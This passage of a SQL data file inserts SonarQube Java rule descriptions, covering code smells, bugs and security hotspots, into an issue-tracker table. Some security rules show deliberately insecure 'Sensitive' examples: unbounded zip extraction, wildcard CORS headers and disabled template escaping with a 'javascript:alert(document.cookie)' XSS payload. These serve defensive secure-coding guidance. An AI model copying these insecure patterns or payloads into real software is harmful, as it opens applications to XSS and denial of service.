INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4925', '"Class.forName()" should not load JDBC 4.0+ drivers', 'sonarqube', 'Code Smell', '<p>In the past, it was required to load a JDBC driver before creating a <code>java.sql.Connection</code>. Nowadays, when using JDBC 4.0 drivers, this
is no longer required and <code>Class.forName()</code> can be safely removed because JDBC 4.0 (JDK 6) drivers available in the classpath are
automatically loaded.</p>
<p>This rule raises an issue when <code>Class.forName()</code> is used with one of the following values:</p>
<ul>
  <li> <code>com.mysql.jdbc.Driver</code> </li>
  <li> <code>oracle.jdbc.driver.OracleDriver</code> </li>
  <li> <code>com.ibm.db2.jdbc.app.DB2Driver</code> </li>
  <li> <code>com.ibm.db2.jdbc.net.DB2Driver</code> </li>
  <li> <code>com.sybase.jdbc.SybDriver</code> </li>
  <li> <code>com.sybase.jdbc2.jdbc.SybDriver</code> </li>
  <li> <code>com.teradata.jdbc.TeraDriver</code> </li>
  <li> <code>com.microsoft.sqlserver.jdbc.SQLServerDriver</code> </li>
  <li> <code>org.postgresql.Driver</code> </li>
  <li> <code>sun.jdbc.odbc.JdbcOdbcDriver</code> </li>
  <li> <code>org.hsqldb.jdbc.JDBCDriver</code> </li>
  <li> <code>org.h2.Driver</code> </li>
  <li> <code>org.firebirdsql.jdbc.FBDriver</code> </li>
  <li> <code>net.sourceforge.jtds.jdbc.Driver</code> </li>
  <li> <code>com.ibm.db2.jcc.DB2Driver</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;

public class Demo {
  private static final String DRIVER_CLASS_NAME = "org.postgresql.Driver";
  private final Connection connection;

  public Demo(String serverURI) throws SQLException, ClassNotFoundException {
    Class.forName(DRIVER_CLASS_NAME); // Noncompliant; no longer required to load the JDBC Driver using Class.forName()
    connection = DriverManager.getConnection(serverURI);
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;

public class Demo {
    private final Connection connection;

    public Demo(String serverURI) throws SQLException {
        connection = DriverManager.getConnection(serverURI);
    }
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4926', '"serialVersionUID" should not be declared blindly', 'sonarqube', 'Code Smell', '<p>Providing a <code>serialVersionUID</code> field on <code>Serializable</code> classes is strongly recommended by the <code>Serializable</code>
documentation but blindly following that recommendation can be harmful.</p>
<p><code>serialVersionUID</code> value is stored with the serialized data and this field is verified when deserializing the data to ensure that the
code reading the data is compatible with the serialized data. In case of failure, it means the serialized data and the code are not in sync and this
fine because you know what''s wrong.</p>
<p>When the <code>serialVersionUID</code> is generated by an IDE or blindly hard-coded, there is a high probability that one will forget to update the
<code>serialVersionUID</code> value when the <code>Serializable</code> class is later enriched with additional fields. As a consequence, old
serialized data will incorrectly be considered compatible with the newer version of the code creating situations which are hard to debug.</p>
<p>Therefore, defining <code>serialVersionUID</code> should be done with care. This rule raises an issue on each <code>serialVersionUID</code> field
declared on classes implementing <code>Serializable</code> to be sure the presence and the value of the <code>serialVersionUID</code> field is
challenged and validated by the team.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo implements Serializable {
  private static final long serialVersionUID = 1;
}

public class BarException extends RuntimeException {
  private static final long serialVersionUID = 8582433437601788991L;
}
</pre>
<h2>See</h2>
<ul>
  <li> Vojtech Ruzicka''s Programming Blog: <a href="https://www.vojtechruzicka.com/explicitly-declare-serialversionuid/">Should I explicitly declare
  serialVersionUID?</a> </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4929', '"read(byte[],int,int)" should be overridden', 'sonarqube', 'Code Smell', '<p>When directly subclassing <code>java.io.InputStream</code> or <code>java.io.FilterInputStream</code>, the only requirement is that you implement
the method <code>read()</code>. However most uses for such streams don''t read a single byte at a time and the default implementation for
<code>read(byte[],int,int)</code> will call <code>read(int)</code> for every single byte in the array which can create a lot of overhead and is
utterly inefficient. It is therefore strongly recommended that subclasses provide an efficient implementation of
<code>read(byte[],int,int)</code>.</p>
<p>This rule raises an issue when a direct subclass of <code>java.io.InputStream</code> or <code>java.io.FilterInputStream</code> doesn''t provide an
override of <code>read(byte[],int,int)</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyInputStream extends java.io.InputStream {
  private FileInputStream fin;

  public MyInputStream(File file) throws IOException {
    fin = new FileInputStream(file);
  }

  @Override
  public int read() throws IOException {
    return fin.read();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyInputStream extends java.io.InputStream {
  private FileInputStream fin;

  public MyInputStream(File file) throws IOException {
    fin = new FileInputStream(file);
  }

  @Override
  public int read() throws IOException {
    return fin.read();
  }

  @Override
  public int read(byte[] b, int off, int len) throws IOException {
    return fin.read(b, off, len);
  }
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn''t raise an issue when the class is declared <code>abstract</code>.</p>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4970', 'Derived exceptions should not hide their parents'' catch blocks', 'sonarqube', 'Code Smell', '<p>The <code>catch</code> block of a checked exception "E" may be hidden because the corresponding <code>try</code> block only throws exceptions
derived from E.</p>
<p>These derived exceptions are handled in dedicated <code>catch</code> blocks prior to the <code>catch</code> block of the base exception E. </p>
<p>The <code>catch</code> block of E is unreachable and should be considered dead code. It should be removed, or the entire try-catch structure should
be refactored.</p>
<p>It is also possible that a single exception type in a multi-catch block may be hidden while the catch block itself is still reachable. In that case
it is enough to only remove the hidden exception type or to replace it with another type.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class HiddenCatchBlock {

  public static class CustomException extends Exception {
  }

  public static class CustomDerivedException extends CustomException {
  }

  public static void main(String[] args) {
    try {
      throwCustomDerivedException();
    } catch(CustomDerivedException e) {
      // ...
    } catch(CustomException e) { // Noncompliant; this code is unreachable
      // ...
    }
  }

  private static void throwCustomDerivedException() throws CustomDerivedException {
    throw new CustomDerivedException();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class HiddenCatchBlock {

  public static class CustomException extends Exception {
  }

  public static class CustomDerivedException extends CustomException {
  }

  public static void main(String[] args) {
    try {
      throwCustomDerivedException();
    } catch(CustomDerivedException e) { // Compliant; try-catch block is "catching" only the Exception that can be thrown in the "try"
      //...
    }
  }
}
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4973', 'Strings and Boxed types should be compared using "equals()"', 'sonarqube', 'Bug', '<p>It''s almost always a mistake to compare two instances of <code>java.lang.String</code> or boxed types like <code>java.lang.Integer</code> using
reference equality <code>==</code> or <code>!=</code>, because it is not comparing actual value but locations in memory.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String firstName = getFirstName(); // String overrides equals
String lastName = getLastName();

if (firstName == lastName) { ... }; // Non-compliant; false even if the strings have the same value
</pre>
<h2>Compliant Solution</h2>
<pre>
String firstName = getFirstName();
String lastName = getLastName();

if (firstName != null &amp;&amp; firstName.equals(lastName)) { ... };
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/595.html">MITRE, CWE-595</a> - Comparison of Object References Instead of Object Contents </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/597.html">MITRE, CWE-597</a> - Use of Wrong Operator in String Comparison </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/UjdGBQ">CERT, EXP03-J.</a> - Do not use the equality operators when comparing values of boxed
  primitives </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/yDdGBQ">CERT, EXP50-J.</a> - Do not confuse abstract object equality with reference equality
  </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4977', 'Type parameters should not shadow other type parameters', 'sonarqube', 'Code Smell', '<p>Shadowing makes it impossible to use the type parameter from the outer scope. Also, it can be confusing to distinguish which type parameter is
being used.</p>
<p>This rule raises an issue when a type parameter from an inner scope uses the same name as one in an outer scope.</p>
<h2>Noncompliant Code Example</h2>
<pre>
 public class TypeParameterHidesAnotherType&lt;T&gt; {

    public class Inner&lt;T&gt; { // Noncompliant
      //...
    }

    private &lt;T&gt; T method() { // Noncompliant
      return null;
    }

  }
</pre>
<h2>Compliant Solution</h2>
<pre>
public class NoTypeParameterHiding&lt;T&gt; {

    public class Inner&lt;S&gt; { // Compliant
      List&lt;S&gt; listOfS;
    }

    private &lt;V&gt; V method() { // Compliant
      return null;
    }

  }
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5042', 'Expanding archive files without controlling resource consumption is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>Successful Zip Bomb attacks occur when an application expands untrusted archive files without controlling the size of the expanded data, which can
lead to denial of service. A Zip bomb is usually a malicious archive file of a few kilobytes of compressed data but turned into gigabytes of
uncompressed data. To achieve this extreme <a href="https://en.wikipedia.org/wiki/Data_compression_ratio">compression ratio</a>, attackers will
compress irrelevant data (eg: a long string of repeated bytes). </p>
<h2>Ask Yourself Whether</h2>
<p>Archives to expand are untrusted and:</p>
<ul>
  <li> There is no validation of the number of entries in the archive. </li>
  <li> There is no validation of the total size of the uncompressed data. </li>
  <li> There is no validation of the ratio between the compressed and uncompressed archive entry. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Define and control the ratio between compressed and uncompressed data, in general the data compression ratio for most of the legit archives is
  1 to 3. </li>
  <li> Define and control the threshold for maximum total size of the uncompressed data. </li>
  <li> Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold, in
  particular it''s not recommended to recursively expand archives (an entry of an archive could be also an archive). </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
File f = new File("ZipBomb.zip");
ZipFile zipFile = new ZipFile(f);
Enumeration&lt;? extends ZipEntry&gt; entries = zipFile.entries(); // Sensitive

while(entries.hasMoreElements()) {
  ZipEntry ze = entries.nextElement();
  File out = new File("./output_onlyfortesting.txt");
  Files.copy(zipFile.getInputStream(ze), out.toPath(), StandardCopyOption.REPLACE_EXISTING);
}
</pre>
<h2>Compliant Solution</h2>
<p>Do not rely on <a href="https://docs.oracle.com/javase/7/docs/api/java/util/zip/ZipEntry.html#getSize()">getsize</a> to retrieve the size of an
uncompressed entry because this method returns what is defined in the archive headers which can be forged by attackers, instead calculate the actual
entry size when unzipping it:</p>
<pre>
File f = new File("ZipBomb.zip");
ZipFile zipFile = new ZipFile(f);
Enumeration&lt;? extends ZipEntry&gt; entries = zipFile.entries();

int THRESHOLD_ENTRIES = 10000;
int THRESHOLD_SIZE = 1000000000; // 1 GB
double THRESHOLD_RATIO = 10;
int totalSizeArchive = 0;
int totalEntryArchive = 0;

while(entries.hasMoreElements()) {
  ZipEntry ze = entries.nextElement();
  InputStream in = new BufferedInputStream(zipFile.getInputStream(ze));
  OutputStream out = new BufferedOutputStream(new FileOutputStream("./output_onlyfortesting.txt"));

  totalEntryArchive ++;

  int nBytes = -1;
  byte[] buffer = new byte[2048];
  int totalSizeEntry = 0;

  while((nBytes = in.read(buffer)) &gt; 0) { // Compliant
      out.write(buffer, 0, nBytes);
      totalSizeEntry += nBytes;
      totalSizeArchive += nBytes;

      double compressionRatio = totalSizeEntry / ze.getCompressedSize();
      if(compressionRatio &gt; THRESHOLD_RATIO) {
        // ratio between compressed and uncompressed data is highly suspicious, looks like a Zip Bomb Attack
        break;
      }
  }

  if(totalSizeArchive &gt; THRESHOLD_SIZE) {
      // the uncompressed data size is too much for the application resource capacity
      break;
  }

  if(totalEntryArchive &gt; THRESHOLD_ENTRIES) {
      // too much entries in this archive, can lead to inodes exhaustion of the system
      break;
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> -
  Security Misconfiguration </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/409.html">MITRE, CWE-409</a> - Improper Handling of Highly Compressed Data (Data Amplification)
  </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/display/java/IDS04-J.+Safely+extract+files+from+ZipInputStream">CERT, IDS04-J.</a> - Safely
  extract files from ZipInputStream </li>
  <li> <a href="https://www.bamsoftware.com/hacks/zipbomb/">bamsoftware.com</a> - A better Zip Bomb </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5122', 'Having a permissive Cross-Origin Resource Sharing policy is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>Having a permissive Cross-Origin Resource Sharing policy is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0269">CVE-2018-0269</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14460">CVE-2017-14460</a> </li>
</ul>
<p><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">Same origin policy</a> in browsers prevents, by default and for
security-reasons, a javascript frontend to perform a cross-origin HTTP request to a resource that has a different origin (domain, protocol, or port)
from its own. The requested target can append additional HTTP headers in response, called <a
href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">CORS</a>, that act like directives for the browser and change the access control policy
/ relax the same origin policy.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> You don''t trust the origin specified, example: <code>Access-Control-Allow-Origin: untrustedwebsite.com</code>. </li>
  <li> Access control policy is entirely disabled: <code>Access-Control-Allow-Origin: *</code> </li>
  <li> Your access control policy is dynamically defined by a user-controlled input like <a
  href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin"><code>origin</code></a> header. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> The <code>Access-Control-Allow-Origin</code> header should be set only for a trusted origin and for specific resources. </li>
  <li> Allow only selected, trusted domains in the <code>Access-Control-Allow-Origin</code> header. Prefer whitelisting domains over blacklisting or
  allowing any domain (do not use * wildcard nor blindly return the <code>Origin</code> header content without any checks). </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>Java servlet framework:</p>
<pre>
@Override
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
    resp.setHeader("Content-Type", "text/plain; charset=utf-8");
    resp.setHeader("Access-Control-Allow-Origin", "*"); // Sensitive
    resp.setHeader("Access-Control-Allow-Credentials", "true");
    resp.setHeader("Access-Control-Allow-Methods", "GET");
    resp.getWriter().write("response");
}
</pre>
<p>Spring MVC framework:</p>
<p><a
href="https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/bind/annotation/CrossOrigin.html">CrossOrigin</a></p>
<pre>
@CrossOrigin // Sensitive
@RequestMapping("")
public class TestController {
    public String home(ModelMap model) {
        model.addAttribute("message", "ok ");
        return "view";
    }
}
</pre>
<p><a
href="https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/cors/CorsConfiguration.html">cors.CorsConfiguration</a></p>
<pre>
CorsConfiguration config = new CorsConfiguration();
config.addAllowedOrigin("*"); // Sensitive
config.applyPermitDefaultValues(); // Sensitive
</pre>
<p><a
href="https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/servlet/config/annotation/CorsRegistration.html">servlet.config.annotation.CorsConfiguration</a></p>
<pre>
class Insecure implements WebMvcConfigurer {
  @Override
  public void addCorsMappings(CorsRegistry registry) {
    registry.addMapping("/**")
      .allowedOrigins("*"); // Sensitive
  }
}
</pre>
<h2>Compliant Solution</h2>
<p>Java Servlet framework:</p>
<pre>
@Override
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
    resp.setHeader("Content-Type", "text/plain; charset=utf-8");
    resp.setHeader("Access-Control-Allow-Origin", "trustedwebsite.com"); // Compliant
    resp.setHeader("Access-Control-Allow-Credentials", "true");
    resp.setHeader("Access-Control-Allow-Methods", "GET");
    resp.getWriter().write("response");
}
</pre>
<p>Spring MVC framework:</p>
<p><a
href="https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/bind/annotation/CrossOrigin.html">CrossOrigin</a></p>
<pre>
@CrossOrigin("trustedwebsite.com") // Compliant
@RequestMapping("")
public class TestController {
    public String home(ModelMap model) {
        model.addAttribute("message", "ok ");
        return "view";
    }
}
</pre>
<p><a
href="https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/cors/CorsConfiguration.html">cors.CorsConfiguration</a></p>
<pre>
CorsConfiguration config = new CorsConfiguration();
config.addAllowedOrigin("http://domain2.com"); // Compliant
</pre>
<p><a
href="https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/servlet/config/annotation/CorsRegistration.html">servlet.config.annotation.CorsConfiguration</a></p>
<pre>
class Safe implements WebMvcConfigurer {
  @Override
  public void addCorsMappings(CorsRegistry registry) {
    registry.addMapping("/**")
      .allowedOrigins("safe.com"); // Compliant
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">developer.mozilla.org</a> - CORS </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">developer.mozilla.org</a> - Same origin policy </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="https://www.owasp.org/index.php/HTML5_Security_Cheat_Sheet#Cross_Origin_Resource_Sharing">OWASP HTML5 Security Cheat Sheet</a> - Cross
  Origin Resource Sharing </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/346.html">MITRE, CWE-346</a> - Origin Validation Error </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/942.html">MITRE, CWE-942</a> - Overly Permissive Cross-domain Whitelist </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5128', '"Bean Validation" (JSR 380) should be properly configured', 'sonarqube', 'Code Smell', '<p><code>Bean Validation</code> as per defined by JSR 380 can be triggered programmatically or also executed by the <code>Bean Validation</code>
providers. However something should tell the <code>Bean Validation</code> provider that a variable must be validated otherwise no validation will
happen. This can be achieved by annotating a variable with <code>javax.validation.Valid</code> and unfortunally it''s easy to forget to add this
annotation on complex Beans.</p>
<p>Not annotating a variable with <code>@Valid</code> means <code>Bean Validation</code> will not be triggered for this variable, but readers may
overlook this omission and assume the variable will be validated.</p>
<p>This rule will run by default on all <code>Class</code>''es and therefore can generate a lot of noise. This rule should be restricted to run only on
certain layers. For this reason, the "Restrict Scope of Coding Rules" feature should be used to check for missing <code>@Valid</code> annotations only
on some packages of the application.</p>
<h2>Noncompliant Code Example</h2>
<pre>
import javax.validation.Valid;
import javax.validation.constraints.NotNull;

public class User {
  @NotNull
  private String name;
}

public class Group {
  @NotNull
  private List&lt;User&gt; users; // Noncompliant; User instances are not validated
}

public class MyService {
  public void login(User user) { // Noncompliant; parameter "user" is not validated
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
import javax.validation.Valid;
import javax.validation.constraints.NotNull;

public class User {
  @NotNull
  private String name;
}

public class Group {
  @Valid
  @NotNull
  private List&lt;User&gt; users; // Compliant; User instances are validated

  @NotNull
  // preferred style as of Bean Validation 2.0
  private List&lt;@Valid User&gt; users2; // Compliant; User instances are validated
}

public class MyService {
  public void login(@Valid User user) { // Compliant
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://beanvalidation.org/2.0/spec/">Bean Validation 2.0 (JSR 380)</a> </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5164', '"ThreadLocal" variables should be cleaned up when no longer used', 'sonarqube', 'Bug', '<p><code>ThreadLocal</code> variables are supposed to be garbage collected once the holding thread is no longer alive. Memory leaks can occur when
holding threads are re-used which is the case on application servers using pool of threads.</p>
<p>To avoid such problems, it is recommended to always clean up <code>ThreadLocal</code> variables using the <code>remove()</code> method to remove
the current thread’s value for the <code>ThreadLocal</code> variable.</p>
<p>In addition, calling <code>set(null)</code> to remove the value might keep the reference to <code>this</code> pointer in the map, which can cause
memory leak in some scenarios. Using <code>remove</code> is safer to avoid this issue.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class ThreadLocalUserSession implements UserSession {

  private static final ThreadLocal&lt;UserSession&gt; DELEGATE = new ThreadLocal&lt;&gt;();

  public UserSession get() {
    UserSession session = DELEGATE.get();
    if (session != null) {
      return session;
    }
    throw new UnauthorizedException("User is not authenticated");
  }

  public void set(UserSession session) {
    DELEGATE.set(session);
  }

   public void incorrectCleanup() {
     DELEGATE.set(null); // Noncompliant
   }

  // some other methods without a call to DELEGATE.remove()
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class ThreadLocalUserSession implements UserSession {

  private static final ThreadLocal&lt;UserSession&gt; DELEGATE = new ThreadLocal&lt;&gt;();

  public UserSession get() {
    UserSession session = DELEGATE.get();
    if (session != null) {
      return session;
    }
    throw new UnauthorizedException("User is not authenticated");
  }

  public void set(UserSession session) {
    DELEGATE.set(session);
  }

  public void unload() {
    DELEGATE.remove(); // Compliant
  }

  // ...
}
</pre>
<h2>Exceptions</h2>
<p>Rule will not detect non-private <code>ThreadLocal</code> variables, because <code>remove()</code> can be called from another class.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.baeldung.com/java-memory-leaks">Understanding Memory Leaks in Java</a> </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5194', 'Use Java 12 "switch" expression', 'sonarqube', 'Code Smell', '<p>Many existing switch statements are essentially simulations of switch expressions, where each arm either assigns to a common target variable or
returns a value. Expressing this as a statement is roundabout, repetitive, and error-prone.</p>
<p>Java 12 added support for switch expressions, which provide more succinct and less error-prone version of switch.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void day_of_week(DoW day) {
    int numLetters;
    switch (day) {  // Noncompliant
      case MONDAY:
      case FRIDAY:
      case SUNDAY:
        numLetters = 6;
        break;
      case TUESDAY:
        numLetters = 7;
        break;
      case THURSDAY:
      case SATURDAY:
        numLetters = 8;
        break;
      case WEDNESDAY:
        numLetters = 9;
        break;
      default:
        throw new IllegalStateException("Wat: " + day);
    }
}

int return_switch(int x) {
    switch (x) { // Noncompliant
      case 1:
        return 1;
      case 2:
        return 2;
      default:
        throw new IllegalStateException();
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int numLetters = switch (day) {
    case MONDAY, FRIDAY, SUNDAY -&gt; 6;
    case TUESDAY                -&gt; 7;
    case THURSDAY, SATURDAY     -&gt; 8;
    case WEDNESDAY              -&gt; 9;
};
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5247', 'Disabling auto-escaping in template engines is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>To reduce the risk of cross-site scripting attacks, templating systems, such as <code>Twig</code>, <code>Django</code>, <code>Smarty</code>,
<code>Groovy''s template engine</code>, allow configuration of automatic variable escaping before rendering templates. When escape occurs, characters
that make sense to the browser (eg: &lt;a&gt;) will be transformed/replaced with escaped/sanitized values (eg: &amp; lt;a&amp; gt; ).</p>
<p>Auto-escaping is not a magic feature to annihilate all cross-site scripting attacks, it depends on <a
href="https://twig.symfony.com/doc/3.x/filters/escape.html">the strategy applied</a> and the context, for example a "html auto-escaping" strategy
(which only transforms html characters into <a href="https://developer.mozilla.org/en-US/docs/Glossary/Entity">html entities</a>) will not be relevant
when variables are used in a <a href="https://en.wikipedia.org/wiki/HTML_attribute">html attribute</a> because ''<code>:</code>'' character is not
escaped and thus an attack as below is possible:</p>
<pre>
&lt;a href="{{ myLink }}"&gt;link&lt;/a&gt; // myLink = javascript:alert(document.cookie)
&lt;a href="javascript:alert(document.cookie)"&gt;link&lt;/a&gt; // JS injection (XSS attack)
</pre>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Templates are used to render web content and
    <ul>
      <li> dynamic variables in templates come from untrusted locations or are user-controlled inputs </li>
      <li> there is no local mechanism in place to sanitize or validate the inputs. </li>
    </ul> </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Enable auto-escaping by default and continue to review the use of inputs in order to be sure that the chosen auto-escaping strategy is the right
one.</p>
<h2>Sensitive Code Example</h2>
<p>With <a href="https://github.com/samskivert/jmustache">JMustache by samskivert</a>:</p>
<pre>
Mustache.compiler().escapeHTML(false).compile(template).execute(context); // Sensitive
Mustache.compiler().withEscaper(Escapers.NONE).compile(template).execute(context); // Sensitive
</pre>
<p>With <a href="https://freemarker.apache.org/">Freemarker</a>:</p>
<pre>
freemarker.template.Configuration configuration = new freemarker.template.Configuration();
configuration.setAutoEscapingPolicy(DISABLE_AUTO_ESCAPING_POLICY); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>With <a href="https://github.com/samskivert/jmustache">JMustache by samskivert</a>:</p>
<pre>
Mustache.compiler().compile(template).execute(context); // Compliant, auto-escaping is enabled by default
Mustache.compiler().escapeHTML(true).compile(template).execute(context); // Compliant
</pre>
<p>With <a href="https://freemarker.apache.org/">Freemarker</a>. See <a
href="https://freemarker.apache.org/docs/api/freemarker/template/Configuration.html#setAutoEscapingPolicy-int-">"setAutoEscapingPolicy"
documentation</a> for more details. </p>
<pre>
freemarker.template.Configuration configuration = new freemarker.template.Configuration();
configuration.setAutoEscapingPolicy(ENABLE_IF_DEFAULT_AUTO_ESCAPING_POLICY); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md">OWASP Cheat
  Sheet</a> - XSS Prevention Cheat Sheet </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)">OWASP Top 10 2017 Category A7</a> - Cross-Site Scripting
  (XSS) </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/79.html">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  (''Cross-site Scripting'') </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/80.html">MITRE, CWE-80</a> - Improper Neutralization of Script-Related HTML Tags in a Web Page
  (Basic XSS) </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/83.html">MITRE, CWE-83</a> - Improper Neutralization of Script in Attributes in a Web Page
  </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/84.html">MITRE, CWE-84</a> - Improper Neutralization of Encoded URI Schemes in a Web Page </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5261', '"else" statements should be clearly matched with an "if"', 'sonarqube', 'Code Smell', '<p>The dangling <code>else</code> problem appears when nested <code>if</code>/<code>else</code>&nbsp;statements are written without curly braces. In
this case, <code>else</code> is associated with the nearest&nbsp;<code>if</code> but that is not always obvious and sometimes the indentation can also
be misleading.</p>
<p>This rules reports <code>else</code> statements that are difficult to understand, because they are inside nested <code>if</code> statements without
curly braces.</p>
<p>Adding curly braces can generally make the code clearer (see rule <a href=''/coding_rules#rule_key=java%3AS121''>S121</a> ), and in this situation of dangling <code>else</code>, it
really clarifies the intention of the code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
 if (a)
   if (b)
     d++;
 else     // Noncompliant, is the "else" associated with "if(a)" or "if (b)"? (the answer is "if(b)")
   e++;
</pre>
<h2>Compliant Solution</h2>
<pre>
 if (a) {
   if (b) {
     d++;
   }
 } else { // Compliant, there is no doubt the "else" is associated with "if(a)"
   e++;
 }
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://en.wikipedia.org/wiki/Dangling_else">https://en.wikipedia.org/wiki/Dangling_else</a> </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5300', 'Sending emails is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>Sending emails is security-sensitive and can expose an application to a large range of vulnerabilities.</p>
<p><strong>Information Exposure</strong></p>
<p>Emails often contain sensitive information which might be exposed to an attacker if he can add an arbitrary address to the recipient list.</p>
<p><strong>Spamming / Phishing</strong></p>
<p>Malicious user can abuse email based feature to send spam or phishing content.</p>
<p><strong>Dangerous Content Injection</strong></p>
<p>Emails can contain HTML and JavaScript code, thus they can be used for XSS attacks.</p>
<p><strong>Email Headers Injection</strong></p>
